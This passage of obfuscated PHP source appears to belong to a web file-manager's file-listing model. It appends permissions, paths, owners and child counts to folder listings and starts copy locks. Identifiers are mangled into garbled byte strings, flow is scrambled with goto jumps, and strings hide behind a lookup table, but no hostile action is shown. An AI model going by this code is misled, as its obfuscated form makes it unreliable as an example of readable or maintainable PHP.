unset($fƒ­ğÃ‰[$B††Ù˜óÅ›][$d·ÊäãˆÃ[76]]); $eó«à‰–Í = is_array($B¯’éäÁÔµ[$B††Ù˜óÅ›]) ? $B¯’éäÁÔµ[$B††Ù˜óÅ›] : array(); $f‘Ëà†ç£[$d·ÊäãˆÃ[164]] = array_merge($eó«à‰–Í, $fƒ­ğÃ‰[$B††Ù˜óÅ›]); goto aÂÙ˜ÑŠà´; a©“•÷Öï: $B††Ù˜óÅ› = $f‘Ëà†ç£[$d·ÊäãˆÃ[445]]; if (!$B††Ù˜óÅ› || !is_array($fƒ­ğÃ‰[$B††Ù˜óÅ›])) { continue; } $AœøÓªñ‘ = $fƒ­ğÃ‰[$B††Ù˜óÅ›]; goto dÏÜ•Õ²Âå; F£§—½¶ßÈ: } unset($f‘Ëà†ç£); goto bµŸÃÊˆî; b„¡†³ß³: $fƒ­ğÃ‰ = Model($d·ÊäãˆÃ[448])->field($aëæ©ÔŸ¦)->where($CŸë¾²áĞä)->select(); $fƒ­ğÃ‰ = array_to_keyvalue($fƒ­ğÃ‰, $d·ÊäãˆÃ[445]); $Bà¤‚Éçà = Model($d·ÊäãˆÃ[449])->field($d·ÊäãˆÃ[450])->where($CŸë¾²áĞä)->select(); goto a„ß˜¬ã©ò; bµŸÃÊˆî: } protected function _listAppendSourceInfo(&$bá…è—Ş·¼, $eï‚ åÄ) { goto eÁÊÒº¬; E÷›ˆÁ´Ô¹: $eíäò¾­ª = array_to_keyvalue($aÎ¥«óÊĞ, $b£Îã°­Ú[392]); $DòÒ¼„„®› = array_to_keyvalue_group($c§¾•¬âÆ, $b£Îã°­Ú[76], $b£Îã°­Ú[417]); $dºßã¸Ç†Ò = array_to_keyvalue($E­¨ÉÛ¬ÕÑ, $b£Îã°­Ú[76]); goto cªÅâ·Ó’ô; eÁÊÒº¬: $b£Îã°­Ú =& $_SERVER[´¬]; if (!defined($b£Îã°­Ú[452])) { return; } $aÎ¥«óÊĞ = Model($b£Îã°­Ú[453])->listData(); goto fæ‚ïö…‹; F—‰×™Ê©˜: return $bá…è—Ş·¼; goto D¿•™Í•íĞ; fæ‚ïö…‹: $c§¾•¬âÆ = Model($b£Îã°­Ú[416])->listData(); $E­¨ÉÛ¬ÕÑ = Model($b£Îã°­Ú[406])->listData(); $e¾ùÌ¢İŞó = Model($b£Îã°­Ú[454])->listSimple(); goto E÷›ˆÁ´Ô¹; cªÅâ·Ó’ô: $E£æŠ¬Ï¤ø = array_to_keyvalue_group($e¾ùÌ¢İŞó, $b£Îã°­Ú[394]); foreach ($bá…è—Ş·¼ as &$cßå…ª§²×) { $cßå…ª§²×[$b£Îã°­Ú[85]] = array($b£Îã°­Ú[455] => 0, $b£Îã°­Ú[456] => 0, $b£Îã°­Ú[457] => 0); if (isset($dºßã¸Ç†Ò[$cßå…ª§²×[$b£Îã°­Ú[394]]])) { $cßå…ª§²×[$b£Îã°­Ú[85]][$b£Îã°­Ú[458]] = 1; $cßå…ª§²×[$b£Îã°­Ú[85]][$b£Îã°­Ú[459]] = $dºßã¸Ç†Ò[$cßå…ª§²×[$b£Îã°­Ú[394]]][$b£Îã°­Ú[28]]; } if (isset($DòÒ¼„„®›[$cßå…ª§²×[$b£Îã°­Ú[394]]])) { $cßå…ª§²×[$b£Îã°­Ú[85]][$b£Îã°­Ú[460]] = array(); foreach ($DòÒ¼„„®›[$cßå…ª§²×[$b£Îã°­Ú[394]]] as $Aåî¦Û‚äÌ) { $A”ã†ŸÎ¸ = $eíäò¾­ª[$Aåî¦Û‚äÌ]; $cßå…ª§²×[$b£Îã°­Ú[85]][$b£Îã°­Ú[460]][] = array($b£Îã°­Ú[461] => $A”ã†ŸÎ¸[$b£Îã°­Ú[392]], $b£Îã°­Ú[411] => $A”ã†ŸÎ¸[$b£Îã°­Ú[28]], $b£Îã°­Ú[462] => $A”ã†ŸÎ¸[$b£Îã°­Ú[463]]); } } if (isset($E£æŠ¬Ï¤ø[$cßå…ª§²×[$b£Îã°­Ú[394]]])) { $cßå…ª§²×[$b£Îã°­Ú[85]][$b£Îã°­Ú[464]] = array(); foreach ($E£æŠ¬Ï¤ø[$cßå…ª§²×[$b£Îã°­Ú[394]]] as $C£òí„éøÏ) { $cßå…ª§²×[$b£Îã°­Ú[85]][$b£Îã°­Ú[464]] = array($b£Îã°­Ú[465] => $C£òí„éøÏ[$b£Îã°­Ú[466]], $b£Îã°­Ú[467] => $C£òí„éøÏ[$b£Îã°­Ú[468]], $b£Îã°­Ú[469] => $C£òí„éøÏ[$b£Îã°­Ú[394]], $b£Îã°­Ú[470] => $C£òí„éøÏ[$b£Îã°­Ú[471]], $b£Îã°­Ú[472] => $C£òí„éøÏ[$b£Îã°­Ú[473]], $b£Îã°­Ú[474] => $C£òí„éøÏ[$b£Îã°­Ú[474]], $b£Îã°­Ú[475] => $C£òí„éøÏ[$b£Îã°­Ú[475]]); } } } unset($cßå…ª§²×); goto F—‰×™Ê©˜; D¿•™Í•íĞ: } protected function _listAppendChildren(&$E©·Õååïæ, $fÓíÎØ„‡ì) { goto F†÷æÎ„¯; DÔªÆÀÑÍ…: unset($e‹¢ˆ¯é); goto d¸·Ôİ¡¦«; Fµ½ÊÃÄ©’: $eÜ¨¨×ê¸ö = array(); foreach ($DÖ÷ìßÁÜ as $C¡‡†Ê§²à) { $bÌ™šŒÇ÷ = $C¡‡†Ê§²à[$fÏ¦âíÑ—ç[476]]; $fÆì¥Å˜òç = $C¡‡†Ê§²à[$fÏ¦âíÑ—ç[401]] == $fÏ¦âíÑ—ç[87] ? $fÏ¦âíÑ—ç[203] : $fÏ¦âíÑ—ç[202]; if (!isset($eÜ¨¨×ê¸ö[$bÌ™šŒÇ÷])) { $eÜ¨¨×ê¸ö[$bÌ™šŒÇ÷] = array($fÏ¦âíÑ—ç[202] => 0, $fÏ¦âíÑ—ç[203] => 0); } $eÜ¨¨×ê¸ö[$bÌ™šŒÇ÷][$fÆì¥Å˜òç] += $C¡‡†Ê§²à[$fÏ¦âíÑ—ç[478]]; } foreach ($E©·Õååïæ as &$e‹¢ˆ¯é) { if (!$e‹¢ˆ¯é[$fÏ¦âíÑ—ç[401]]) { continue; } $FàØ³åìß§ = is_array($eÜ¨¨×ê¸ö[$e‹¢ˆ¯é[$fÏ¦âíÑ—ç[394]]]) ? $eÜ¨¨×ê¸ö[$e‹¢ˆ¯é[$fÏ¦âíÑ—ç[394]]] : $c¤å…Çö; $e‹¢ˆ¯é[$fÏ¦âíÑ—ç[203]] = $FàØ³åìß§[$fÏ¦âíÑ—ç[203]]; $e‹¢ˆ¯é[$fÏ¦âíÑ—ç[202]] = $FàØ³åìß§[$fÏ¦âíÑ—ç[202]]; unset($e‹¢ˆ¯é[$fÏ¦âíÑ—ç[403]]); } goto DÔªÆÀÑÍ…; b»‚•ÌååÜ: $Aé³¥§„ØÎ = array($fÏ¦âíÑ—ç[476] => array($fÏ¦âíÑ—ç[7], $b…àöŞ“®)); $c„Û•ô»ñ‹ = array($fÏ¦âíÑ—ç[476], $fÏ¦âíÑ—ç[401], $fÏ¦âíÑ—ç[477] => $fÏ¦âíÑ—ç[478]); $DÖ÷ìßÁÜ = $this->field($c„Û•ô»ñ‹)->where($Aé³¥§„ØÎ)->group($fÏ¦âíÑ—ç[479])->select(); goto Fµ½ÊÃÄ©’; D´ì’âœâ×: foreach ($E©·Õååïæ as &$e‹¢ˆ¯é) { if (!$e‹¢ˆ¯é[$fÏ¦âíÑ—ç[401]]) { continue; } $b…àöŞ“®[] = $e‹¢ˆ¯é[$fÏ¦âíÑ—ç[394]]; } unset($e‹¢ˆ¯é); if (!$b…àöŞ“®) { return; } goto b»‚•ÌååÜ; F†÷æÎ„¯: $fÏ¦âíÑ—ç =& $_SERVER[´¬]; $b…àöŞ“® = array(); $c¤å…Çö = array($fÏ¦âíÑ—ç[202] => 0, $fÏ¦âíÑ—ç[203] => 0); goto D´ì’âœâ×; d¸·Ôİ¡¦«: } protected function _listAppendAuth(&$dåˆÉìİõ‘) { goto Bœè­Ëà¿÷; f§½Á©¼¾Ì: foreach ($dåˆÉìİõ‘ as $c…Õ„™àŞ) { if ($c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[402]] == self::TYPE_GROUP) { $FŒ˜¹î¸Œà[] = $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[394]]; } } if (!$FŒ˜¹î¸Œà) { return; } $DóÅĞõÓõ = array_to_keyvalue($dåˆÉìİõ‘, $FÒ¸‹‡Â’Ø[394]); goto fª—ƒÍÌŒ; Bœè­Ëà¿÷: $FÒ¸‹‡Â’Ø =& $_SERVER[´¬]; if (!defined($FÒ¸‹‡Â’Ø[452])) { return; } $FŒ˜¹î¸Œà = array(); goto f§½Á©¼¾Ì; fª—ƒÍÌŒ: $dÕ·ÌÀí¸à = Model($FÒ¸‹‡Â’Ø[480])->getSourceList($FŒ˜¹î¸Œà, $DóÅĞõÓõ); foreach ($dåˆÉìİõ‘ as $CÁâ‹ºê‘´ => &$c…Õ„™àŞ) { $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]] = $dÕ·ÌÀí¸à[$c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[394]]]; if (!$c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]] && $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[402]] == self::TYPE_GROUP) { $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]] = Action($FÒ¸‹‡Â’Ø[481])->pathGroupAuthMake($c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[482]]); if (!$c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]] && !_get($GLOBALS, $FÒ¸‹‡Â’Ø[483])) { $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[195]] = !1; $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[194]] = !1; } } if ($c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]]) { $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[195]] = AuthModel::authCheckEdit($c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]][$FÒ¸‹‡Â’Ø[405]]); $c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[194]] = AuthModel::authCheckView($c…Õ„™àŞ[$FÒ¸‹‡Â’Ø[404]][$FÒ¸‹‡Â’Ø[405]]); } $this->groupPathDisplay($c…Õ„™àŞ); } unset($c…Õ„™àŞ); goto C°ÜƒÍÌ•˜; C°ÜƒÍÌ•˜: } public function groupPathDisplay(&$EË‡‰£ß³½) { goto C‰È‡éáÅ¤; CÙ„Ù¦£¤Ù: $EË‡‰£ß³½[$f‡Ô†‚Ù‡[490]] = $a­–ÊÃ¥ßÀ . $AİÏˆ‚ˆÈª[$f‡Ô†‚Ù‡[85]][$f‡Ô†‚Ù‡[394]]; goto f„½Ğ““Ş¤; C‰È‡éáÅ¤: $f‡Ô†‚Ù‡ =& $_SERVER[´¬]; if ($EË‡‰£ß³½[$f‡Ô†‚Ù‡[402]] != self::TYPE_GROUP) { return; } $AİÏˆ‚ˆÈª = Model($f‡Ô†‚Ù‡[484])->getInfo($EË‡‰£ß³½[$f‡Ô†‚Ù‡[482]]); goto F®‡äŒ´±¡; F®‡äŒ´±¡: $f¥‘ä‹Äº… = $this->parentLevelArray($AİÏˆ‚ˆÈª[$f‡Ô†‚Ù‡[485]]); $a­–ÊÃ¥ßÀ = $f‡Ô†‚Ù‡[33]; foreach ($f¥‘ä‹Äº… as $Eöòí’é°) { $eôÍÆ­©¶ = Model($f‡Ô†‚Ù‡[484])->getInfo($Eöòí’é°); $a­–ÊÃ¥ßÀ .= $eôÍÆ­©¶[$f‡Ô†‚Ù‡[85]][$f‡Ô†‚Ù‡[394]] . $f‡Ô†‚Ù‡[47]; } goto fâÅ×œ†¹ï; fâÅ×œ†¹ï: $EË‡‰£ß³½[$f‡Ô†‚Ù‡[486]] = $AİÏˆ‚ˆÈª[$f‡Ô†‚Ù‡[476]]; $EË‡‰£ß³½[$f‡Ô†‚Ù‡[487]] = $AİÏˆ‚ˆÈª[$f‡Ô†‚Ù‡[485]]; $EË‡‰£ß³½[$f‡Ô†‚Ù‡[488]] = $AİÏˆ‚ˆÈª[$f‡Ô†‚Ù‡[489]]; goto CÙ„Ù¦£¤Ù; f„½Ğ““Ş¤: } protected function _listAppendPath(&$eÑÎï×ÑÍ¥) { goto cå¬ùÈÍ½; cå¬ùÈÍ½: $BÁ¬À’¾× =& $_SERVER[´¬]; static $D¼½‘©à¹ = array(); $A»¯°²Ú¥ˆ = array(); goto c»Á¨°¨í; c»Á¨°¨í: $bÏÏ¹ïä¸ = array(); foreach ($eÑÎï×ÑÍ¥ as &$F Ÿƒ‹¯š‰) { $FŞ„ÎÀÅÁ = $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[401]] == $BÁ¬À’¾×[87]; if ($FŞ„ÎÀÅÁ) { $D¼½‘©à¹[$F Ÿƒ‹¯š‰[$BÁ¬À’¾×[394]]] = $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[28]]; } if (isset($bÏÏ¹ïä¸[$F Ÿƒ‹¯š‰[$BÁ¬À’¾×[485]]])) { continue; } $bÏÏ¹ïä¸[$F Ÿƒ‹¯š‰[$BÁ¬À’¾×[485]]] = !0; $aæ‡‘¨šœª = $this->parentLevelArray($F Ÿƒ‹¯š‰[$BÁ¬À’¾×[485]]); foreach ($aæ‡‘¨šœª as $aÀğ¾Áâ˜ƒ => $f‘÷÷°«¢§) { if ($aÀğ¾Áâ˜ƒ != 0 && !isset($D¼½‘©à¹[$f‘÷÷°«¢§])) { $A»¯°²Ú¥ˆ[] = $f‘÷÷°«¢§; } } } unset($F Ÿƒ‹¯š‰); goto EŠÈæ²‚£±; BÁè¶Ü•Áá: $a‰¯ŒÍ§« = array(); $DŒ¯«ˆ…‘‘ = array(); foreach ($eÑÎï×ÑÍ¥ as &$F Ÿƒ‹¯š‰) { goto bëİòÊÄï; CöŒ§ÌİãÒ: if (intval($F Ÿƒ‹¯š‰[$BÁ¬À’¾×[402]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($F Ÿƒ‹¯š‰, $aæ‡‘¨šœª, $d†àˆÄà‹); } goto Có‹¼Ú¬Ö°; bëİòÊÄï: $Dµ¹î‹ó = $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[485]]; if (isset($DŒ¯«ˆ…‘‘[$Dµ¹î‹ó])) { $Aô¼›Ë…°Æ = $a‰¯ŒÍ§«[$Dµ¹î‹ó]; } else { $aæ‡‘¨šœª = $this->parentLevelArray($F Ÿƒ‹¯š‰[$BÁ¬À’¾×[485]]); $Fìî¾Ì¥‰› = $BÁ¬À’¾×[492] . $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[402]] . $BÁ¬À’¾×[438] . $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[482]]; if ($a‰¯ŒÍ§«[$Fìî¾Ì¥‰›]) { $Aô¼›Ë…°Æ = $a‰¯ŒÍ§«[$Fìî¾Ì¥‰›]; } else { $Aô¼›Ë…°Æ = $this->_listAppendPathRoot($F Ÿƒ‹¯š‰, $aæ‡‘¨šœª); $a‰¯ŒÍ§«[$Fìî¾Ì¥‰›] = $Aô¼›Ë…°Æ; } foreach ($aæ‡‘¨šœª as $aÀğ¾Áâ˜ƒ => $f‘÷÷°«¢§) { if ($aÀğ¾Áâ˜ƒ == 0 && $Aô¼›Ë…°Æ && $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[402]] == self::TYPE_GROUP) { continue; } if (isset($D¼½‘©à¹[$f‘÷÷°«¢§])) { $Aô¼›Ë…°Æ .= $D¼½‘©à¹[$f‘÷÷°«¢§] . $BÁ¬À’¾×[8]; } } if ($aæ‡‘¨šœª) { $Aô¼›Ë…°Æ .= $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[28]]; } $a‰¯ŒÍ§«[$Dµ¹î‹ó] = $Aô¼›Ë…°Æ; } if ($F Ÿƒ‹¯š‰[$BÁ¬À’¾×[401]]) { $Aô¼›Ë…°Æ .= $BÁ¬À’¾×[8]; } goto bÙçŠ§Ù‡‡; bÙçŠ§Ù‡‡: $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[493]] = str_replace($BÁ¬À’¾×[494], $BÁ¬À’¾×[8], $Aô¼›Ë…°Æ); $DÕ¬êÖÃ¢” = trim($F Ÿƒ‹¯š‰[$BÁ¬À’¾×[493]], $BÁ¬À’¾×[8]); if ($F Ÿƒ‹¯š‰[$BÁ¬À’¾×[476]] == $BÁ¬À’¾×[495] && $DÕ¬êÖÃ¢”) { $F Ÿƒ‹¯š‰[$BÁ¬À’¾×[28]] = $DÕ¬êÖÃ¢”; } goto CöŒ§ÌİãÒ; Có‹¼Ú¬Ö°: } goto E‰¿ÔŸá¾; EŠÈæ²‚£±: $A»¯°²Ú¥ˆ = array_unique($A»¯°²Ú¥ˆ); if (count($A»¯°²Ú¥ˆ) > 0) { $cÌ’åÃâà¹ = array($BÁ¬À’¾×[408] => array($BÁ¬À’¾×[409], $A»¯°²Ú¥ˆ)); if (count($A»¯°²Ú¥ˆ) == 1) { $aùáêï»Ğ = $this->sourceInfo($A»¯°²Ú¥ˆ[0]); $A˜õì»˜ğâ = is_array($aùáêï»Ğ) ? array($aùáêï»Ğ) : !1; } else { $A˜õì»˜ğâ = $this->field($BÁ¬À’¾×[491])->where($cÌ’åÃâà¹)->select(); } if (!$A˜õì»˜ğâ) { $A˜õì»˜ğâ = array(); } foreach ($A˜õì»˜ğâ as $c”‹§©¸†) { $D¼½‘©à¹[$c”‹§©¸†[$BÁ¬À’¾×[394]]] = $c”‹§©¸†[$BÁ¬À’¾×[28]]; } } $d†àˆÄà‹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto BÁè¶Ü•Áá; E‰¿ÔŸá¾: unset($F Ÿƒ‹¯š‰); return $eÑÎï×ÑÍ¥; goto aôÑïÆ™…; aôÑïÆ™…: } private function _listAppendPathRecycle(&$b‹åÖÕ÷àö, $FÂê·ïâŞ, $eˆÖ°ìè) { goto Cº´Ô¸ìÙä; C—ÍãÀˆ: if ($b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[394]] == $eˆÖ°ìè) { $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[485]] = $Bƒ£ÊÌŒ›ˆ[497]; $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[476]] = $Bƒ£ÊÌŒ›ˆ[495]; $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[28]] = LNG($Bƒ£ÊÌŒ›ˆ[496]); } $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[498]] = $Bƒ£ÊÌŒ›ˆ[499]; goto eùŠº¯; F™·ñèÈÄ: $a¼ÍÎ„ÅÄÈ = implode($Bƒ£ÊÌŒ›ˆ[8], array_slice($b©º“¦¸, 2)); $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[493]] = $Bƒ£ÊÌŒ›ˆ[8] . LNG($Bƒ£ÊÌŒ›ˆ[496]) . $Bƒ£ÊÌŒ›ˆ[8] . ltrim($a¼ÍÎ„ÅÄÈ, $Bƒ£ÊÌŒ›ˆ[8]); $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[485]] = $Bƒ£ÊÌŒ›ˆ[497] . implode($Bƒ£ÊÌŒ›ˆ[47], array_slice($FÂê·ïâŞ, 1)) . $Bƒ£ÊÌŒ›ˆ[47]; goto C—ÍãÀˆ; Cº´Ô¸ìÙä: $Bƒ£ÊÌŒ›ˆ =& $_SERVER[´¬]; if (!in_array($eˆÖ°ìè, $FÂê·ïâŞ) && $b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[394]] != $eˆÖ°ìè) { return; } $b©º“¦¸ = explode($Bƒ£ÊÌŒ›ˆ[8], trim($b‹åÖÕ÷àö[$Bƒ£ÊÌŒ›ˆ[493]], $Bƒ£ÊÌŒ›ˆ[8])); goto F™·ñèÈÄ; eùŠº¯: } protected function _listAppendPathRoot(&$BŞã½·Á”à, $dÌ®ãí¾¼ó) { $dÅÓ·¦ãƒ =& $_SERVER[´¬]; $b¬Å‚¡™œ = $dÅÓ·¦ãƒ[33]; if ($BŞã½·Á”à[$dÅÓ·¦ãƒ[402]] == self::TYPE_USER) { if (defined($dÅÓ·¦ãƒ[452]) && $BŞã½·Á”à[$dÅÓ·¦ãƒ[482]] == USER_ID) { $b¬Å‚¡™œ = LNG($dÅÓ·¦ãƒ[500]); if (!$dÌ®ãí¾¼ó) { $BŞã½·Á”à[$dÅÓ·¦ãƒ[28]] = $b¬Å‚¡™œ; } } else { $eÙï‰ìâ¶Ç = Model($dÅÓ·¦ãƒ[501])->getInfoSimple($BŞã½·Á”à[$dÅÓ·¦ãƒ[482]]); $b¬Å‚¡™œ = LNG($dÅÓ·¦ãƒ[502]) . $dÅÓ·¦ãƒ[160] . $eÙï‰ìâ¶Ç[$dÅÓ·¦ãƒ[28]] . $dÅÓ·¦ãƒ[503]; } } else { if ($BŞã½·Á”à[$dÅÓ·¦ãƒ[402]] == self::TYPE_GROUP) { $eÙï‰ìâ¶Ç = Model($dÅÓ·¦ãƒ[484])->getInfoSimple($BŞã½·Á”à[$dÅÓ·¦ãƒ[482]]); $b¬Å‚¡™œ = $eÙï‰ìâ¶Ç[$dÅÓ·¦ãƒ[28]]; } else { if ($BŞã½·Á”à[$dÅÓ·¦ãƒ[402]] == self::TYPE_SYSTEM) { $b¬Å‚¡™œ = $dÅÓ·¦ãƒ[504]; } } } $b¬Å‚¡™œ = $b¬Å‚¡™œ ? $dÅÓ·¦ãƒ[8] . $b¬Å‚¡™œ . $dÅÓ·¦ãƒ[8] : $dÅÓ·¦ãƒ[8]; return $b¬Å‚¡™œ; } protected function _listAppendUser(&$céóì©£¸æ) { goto EŠÇÊÆÀ–; EŠÇÊÆÀ–: $Eæß‰ƒ ï– =& $_SERVER[´¬]; $d¾çË³šàò = array_to_keyvalue($céóì©£¸æ, $Eæß‰ƒ ï–[33], $Eæß‰ƒ ï–[430]); $A¡é°Æâƒ„ = array_to_keyvalue($céóì©£¸æ, $Eæß‰ƒ ï–[33], $Eæß‰ƒ ï–[432]); goto DøÑó®ì¸; DøÑó®ì¸: $Bßï¾”‡ª­ = array_merge($d¾çË³šàò, $A¡é°Æâƒ„); $d“ÂçÁç = Model($Eæß‰ƒ ï–[505])->userListInfo($Bßï¾”‡ª­); foreach ($céóì©£¸æ as &$eÆ¾á…éÊÜ) { $a¼’­µœ¡ = $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[430]]; $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[430]] = $d“ÂçÁç[$a¼’­µœ¡] ? $d“ÂçÁç[$a¼’­µœ¡] : !1; $a¼’­µœ¡ = $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[432]]; $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[432]] = $d“ÂçÁç[$a¼’­µœ¡] ? $d“ÂçÁç[$a¼’­µœ¡] : !1; if (isset($eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[443]]) && $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[443]][$Eæß‰ƒ ï–[506]]) { $EÛğ£Ë¸ = $GLOBALS[$Eæß‰ƒ ï–[6]][$Eæß‰ƒ ï–[88]][$Eæß‰ƒ ï–[507]]; if ($eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[443]][$Eæß‰ƒ ï–[508]] <= time() - $EÛğ£Ë¸) { $this->metaSet($eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[394]], $Eæß‰ƒ ï–[506], null); $this->metaSet($eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[394]], $Eæß‰ƒ ï–[508], null); unset($eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[443]][$Eæß‰ƒ ï–[506]]); continue; } $A¦••˜•·ê = $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[443]][$Eæß‰ƒ ï–[506]]; $eÆ¾á…éÊÜ[$Eæß‰ƒ ï–[443]][$Eæß‰ƒ ï–[509]] = Model($Eæß‰ƒ ï–[505])->getInfoSimpleOuter($A¦••˜•·ê); } } goto F˜ä Ò›; F˜ä Ò›: unset($eÆ¾á…éÊÜ); goto D†óßæÌÁ; D†óßæÌÁ: } public function parentLevelArray($bñÄöˆ½®À) { $a¬ñ—«ù´È =& $_SERVER[´¬]; $bñÄöˆ½®À = explode($a¬ñ—«ù´È[47], trim($bñÄöˆ½®À, $a¬ñ—«ù´È[47])); return array_remove_value($bñÄöˆ½®À, $a¬ñ—«ù´È[495]); } public function listAll($eâ“½”š) { goto dùîÕ×ÌîÁ; DµÃäôÒí˜: $EêÇ×¸æ = array_to_keyvalue($EêÇ×¸æ, $eŒ‹ÒÒªà[394]); $dÒê…ÕÁÑÇ = "\x2f{$BˆÃ½—‡’[$eŒ‹ÒÒªà[28]]}\57"; $dÒê…ÕÁÑÇ = $dÒê…ÕÁÑÇ == $eŒ‹ÒÒªà[494] ? $eŒ‹ÒÒªà[8] : $dÒê…ÕÁÑÇ; goto eŠïâãİÓá; dùîÕ×ÌîÁ: $eŒ‹ÒÒªà =& $_SERVER[´¬]; $BˆÃ½—‡’ = $this->sourceInfo($eâ“½”š); $DÔ™Éšç = array($eŒ‹ÒÒªà[510] => array($eŒ‹ÒÒªà[511], $BˆÃ½—‡’[$eŒ‹ÒÒªà[485]] . $eâ“½”š . $eŒ‹ÒÒªà[512]), $eŒ‹ÒÒªà[513] => 0); goto EÙ™“‚†é; EÙ™“‚†é: $D£²³‘ÙÌî = $eŒ‹ÒÒªà[514]; $eÔ¡¸‰ÀÌ‡ = "\x4c\105\106\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\151\157\x5f\146\x69\154\145\40\146\151\154\145\x20\x6f\x6e\40\163\x6f\165\x72\x63\145\56\x66\x69\x6c\145\111\x44\x20\x3d\40\146\151\154\x65\56\146\x69\154\145\x49\104"; $EêÇ×¸æ = $this->alias($eŒ‹ÒÒªà[515])->field($D£²³‘ÙÌî)->where($DÔ™Éšç)->join($eÔ¡¸‰ÀÌ‡)->select(); goto DÀäµ¸ÊÂå; eŠïâãİÓá: $dù±×¸óİ = array(); foreach ($EêÇ×¸æ as $F‘è¿¤›Ÿç => $c‰™…ãéÔ˜) { goto FÜÈå°ÂÃâ; eêäŒ¸ªÚ‚: if (!$c‰™…ãéÔ˜[$eŒ‹ÒÒªà[401]]) { $eÒØÕ‹„í¬[$eŒ‹ÒÒªà[445]] = $c‰™…ãéÔ˜[$eŒ‹ÒÒªà[445]]; $eÒØÕ‹„í¬[$eŒ‹ÒÒªà[86]] = $c‰™…ãéÔ˜[$eŒ‹ÒÒªà[76]]; } $dù±×¸óİ[] = $eÒØÕ‹„í¬; goto fÜÌ–‰Ö¡Õ; d…¦š£ËÉ›: $AÇßãÕ‘ÔÏ = str_replace($eŒ‹ÒÒªà[494], $eŒ‹ÒÒªà[8], $AÇßãÕ‘ÔÏ); $AÇßãÕ‘ÔÏ = str_replace($eŒ‹ÒÒªà[494], $eŒ‹ÒÒªà[8], $AÇßãÕ‘ÔÏ); $eÒØÕ‹„í¬ = array($eŒ‹ÒÒªà[412] => str_replace($eŒ‹ÒÒªà[494], $eŒ‹ÒÒªà[8], $AÇßãÕ‘ÔÏ), $eŒ‹ÒÒªà[516] => intval($c‰™…ãéÔ˜[$eŒ‹ÒÒªà[401]]), $eŒ‹ÒÒªà[85] => $this->pathInfoFilter($c‰™…ãéÔ˜)); goto eêäŒ¸ªÚ‚; E‰å•¶—Ì: for ($eµó¦¾ªÀ = 0; $eµó¦¾ªÀ < count($b²Ú¢øˆõÖ); $eµó¦¾ªÀ++) { $AÇßãÕ‘ÔÏ .= $EêÇ×¸æ[$b²Ú¢øˆõÖ[$eµó¦¾ªÀ]][$eŒ‹ÒÒªà[28]] . $eŒ‹ÒÒªà[8]; } $AÇßãÕ‘ÔÏ .= $c‰™…ãéÔ˜[$eŒ‹ÒÒªà[28]]; if ($c‰™…ãéÔ˜[$eŒ‹ÒÒªà[401]]) { $AÇßãÕ‘ÔÏ .= $eŒ‹ÒÒªà[8]; } goto d…¦š£ËÉ›; FÜÈå°ÂÃâ: $b²Ú¢øˆõÖ = $this->parentLevelArray($c‰™…ãéÔ˜[$eŒ‹ÒÒªà[485]]); array_shift($b²Ú¢øˆõÖ); $AÇßãÕ‘ÔÏ = $dÒê…ÕÁÑÇ; goto E‰å•¶—Ì; fÜÌ–‰Ö¡Õ: } return $dù±×¸óİ; goto aÃÃ¿½µ­Ø; DÀäµ¸ÊÂå: $this->_listAppendAuth($EêÇ×¸æ); $this->_listAppendUser($EêÇ×¸æ); $this->_listAppendPath($EêÇ×¸æ); goto DµÃäôÒí˜; aÃÃ¿½µ­Ø: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($aê©©‰ê¥Å) { goto B²Öë² è”; B²Öë² è”: $BÅºÈÄôœ =& $_SERVER[´¬]; if (!$this->allowLock()) { return; } $this->_lockCheck($BÅºÈÄôœ[517], $aê©©‰ê¥Å); goto fÉ±±æÌ¢à; a•¿’…ŠÆš: $this->_lockEvent($aê©©‰ê¥Å, array($BÅºÈÄôœ[520], $BÅºÈÄôœ[521]), $D”Á©‡¶—–); $this->_lockCheckEnd($BÅºÈÄôœ[517], $aê©©‰ê¥Å); goto Eö­æÚ¼†œ; fÉ±±æÌ¢à: $D”Á©‡¶—– = 1; $this->_lockEvent($aê©©‰ê¥Å, array($BÅºÈÄôœ[518], 